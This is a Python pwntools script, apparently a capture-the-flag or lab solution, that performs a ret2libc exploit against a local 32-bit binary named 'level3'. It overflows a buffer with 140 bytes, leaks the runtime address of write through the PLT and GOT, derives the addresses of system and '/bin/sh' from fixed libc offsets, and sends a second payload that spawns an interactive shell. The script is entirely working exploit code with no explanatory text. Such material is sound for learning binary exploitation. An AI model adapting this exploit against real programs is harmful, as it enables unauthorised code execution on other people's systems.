from pwn import *


def ret2_libc3_2(file_name='/mnt/hgfs/Cyber Security PWN/test/pwn3/level3'):
    io = process([file_name])
    elf = ELF(file_name)

    pop_ret_gadget = p32(0x0804851b)  # pop ebp ; ret
    pop3_ret_gadget = p32(0x08048519)  # pop esi ; pop edi ; pop ebp ; ret

    write_plt = p32(elf.plt['write'])
    write_got = p32(elf.got['write'])
    read_text = p32(0x0804844B)

    payload = b'A' * 140

    # write("%p", *write_got)
    payload += write_plt + pop3_ret_gadget + p32(0x1) + write_got + p32(0x4)

    # read(0, buf, 0x100u)
    payload += read_text

    print(io.recvline())

    io.sendline(payload)

    write_libc = int.from_bytes(io.recv(4), "little")
    print(hex(write_libc))

    system_libc = p32(write_libc - (0x000D43C0 - 0x0003A940))
    bin_sh_libc = p32(write_libc + (0x0015902B - 0x000D43C0))

    payload = b'A' * 140
    payload += system_libc + pop_ret_gadget + bin_sh_libc

    io.sendline(payload)

    io.interactive()


if __name__ == '__main__':
    ret2_libc3_2()
